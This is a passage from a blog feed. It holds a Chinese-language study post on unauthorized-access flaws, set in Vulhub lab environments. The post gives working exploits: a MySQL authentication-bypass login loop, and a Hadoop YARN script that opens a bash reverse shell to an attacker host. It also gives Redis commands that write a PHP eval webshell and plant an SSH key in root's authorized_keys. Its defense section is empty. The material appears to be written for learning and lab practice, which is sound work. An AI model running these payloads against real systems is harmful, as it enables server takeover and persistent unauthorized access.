    <summary type="html">&lt;h2 id=&quot;内网基本概念&quot;&gt;&lt;a href=&quot;#内网基本概念&quot; class=&quot;headerlink&quot; title=&quot;内网基本概念&quot;&gt;&lt;/a&gt;内网基本概念&lt;/h2&gt;&lt;h4 id=&quot;局域网&quot;&gt;&lt;a href=&quot;#局域网&quot; class=&quot;headerlink&quot; title=&quot;局域网</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>未授权访问</title>
    <link href="https://myprefer.github.io/post/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"/>
    <id>https://myprefer.github.io/post/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html</id>
    <published>2024-03-26T07:47:00.000Z</published>
    <updated>2024-03-26T15:09:50.816Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><ul><li>未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作。</li></ul><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>泄露用户信息，系统信息</li><li>某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏</li></ul><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h5 id="判断服务开放"><a href="#判断服务开放" class="headerlink" title="判断服务开放"></a>判断服务开放</h5><ul><li>Nmap端口扫描</li><li>组合猜测</li></ul><h5 id="判断服务类型"><a href="#判断服务类型" class="headerlink" title="判断服务类型"></a>判断服务类型</h5><ul><li>数据库</li><li>文件传输</li><li>远程控制</li><li>数据通信</li></ul><h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><ul><li><p>环境:<a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">Mysql 身份认证绕过漏洞（CVE-2012-2122）</a></p></li><li><p>原理:</p><blockquote><p>当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说<strong>只要知道用户名</strong>，不断尝试就能够<strong>直接登入</strong>SQL数据库。</p></blockquote></li><li><p>利用:</p><pre><code class="sql">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done</code></pre></li></ul><h4 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h4><ul><li><p>环境:<a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">Vulhub - Docker-Compose file for vulnerability environment</a></p></li><li><p>原理:</p><blockquote><p>负责对资源进行同一管理调度的ReasourceManager组件的UI管理界面开放在8080&#x2F;8088端口，攻击者<strong>无需认证</strong>即可通过REST API部署任务来<strong>执行任意命令</strong>，最终可完全控制集群中所有的机器。</p></blockquote></li><li><p>脚本:</p><pre><code class="python">#!/usr/bin/env pythonimport requeststarget = &#39;http://127.0.0.1:8088/&#39;lhost = &#39;192.168.0.1&#39; # put your local host ip here, and listen at port 9999url = target + &#39;ws/v1/cluster/apps/new-application&#39;resp = requests.post(url)app_id = resp.json()[&#39;application-id&#39;]url = target + &#39;ws/v1/cluster/apps&#39;data = &#123;    &#39;application-id&#39;: app_id,    &#39;application-name&#39;: &#39;get-shell&#39;,    &#39;am-container-spec&#39;: &#123;        &#39;commands&#39;: &#123;            &#39;command&#39;: &#39;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#39; % lhost,        &#125;,    &#125;,    &#39;application-type&#39;: &#39;YARN&#39;,&#125;requests.post(url, json=data)</code></pre></li></ul><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><ul><li><p>原理:</p><ul><li>redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器</li><li>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</li></ul></li><li><p>利用:</p><ul><li><p>写webshell</p><ul><li><p>利用前提:</p><ol><li><p>靶机redis链接未授权，在攻击机上能用redis-cli连上, 并未登陆验证</p></li><li><p>开了web服务器，并且知道路径, 需要具有文件读写增删改查权限</p></li></ol></li><li><p>上传webshell</p><pre><code class="sh">config get dir #查看redis数据库路径config set dir /root/redis-2.8.17# #修改靶机Redis数据库路径config set dbfilename 22.php #生成22.php文件set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接save#保存</code></pre></li></ul></li><li><p>ssh密钥连接</p><ul><li><p>利用前提:</p><ol><li>root身份运行</li><li>存在&#x2F;root&#x2F;.ssh目录</li></ol></li><li><p>将公钥上传到靶机</p><pre><code class="sh">type key.txt | redis-cli.exe -h 192.168.43.141 -x set xxx#如果是linux 将type换成cat#将公钥作为value插入到数据库中，key随便啥值。redis-cli.exe -h 192.168.43.141 config set dir /root/.ssh#修改redis数据库路径redis-cli.exe -h 192.168.43.141 config set dbfilename authorized_keys#生成缓冲文件authorized_keysredis-cli.exe -h 192.168.43.141 save#保存ssh -i id_rsa root@192.168.43.141#连接</code></pre></li></ul></li><li><p>RCE自动化利用脚本<br><a href="https://github.com/vulhub/redis-rogue-getshell">vulhub&#x2F;redis-rogue-getshell: redis 4.x&#x2F;5.x master&#x2F;slave getshell module (github.com)</a></p></li></ul></li></ul><h3 id="常见漏洞汇总"><a href="#常见漏洞汇总" class="headerlink" title="常见漏洞汇总"></a>常见漏洞汇总</h3><ul><li><p><a href="https://www.freebuf.com/articles/web/338459.html">常用的30+种未授权访问漏洞汇总 - FreeBuf网络安全行业门户</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/IK7n5onsyssmJyf5SPpw6A">网络安全周周学 | 常见未授权访问漏洞汇总</a></p></li></ul><h3 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;漏洞简述&quot;&gt;&lt;a href=&quot;#漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;漏洞简述&quot;&gt;&lt;/a&gt;漏洞简述&lt;/h3&gt;&lt;h4 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h</summary>
      
    
    
    
    
    <category term="网络安全" scheme="https://myprefer.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="学习日志" scheme="https://myprefer.github.io/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
</feed>
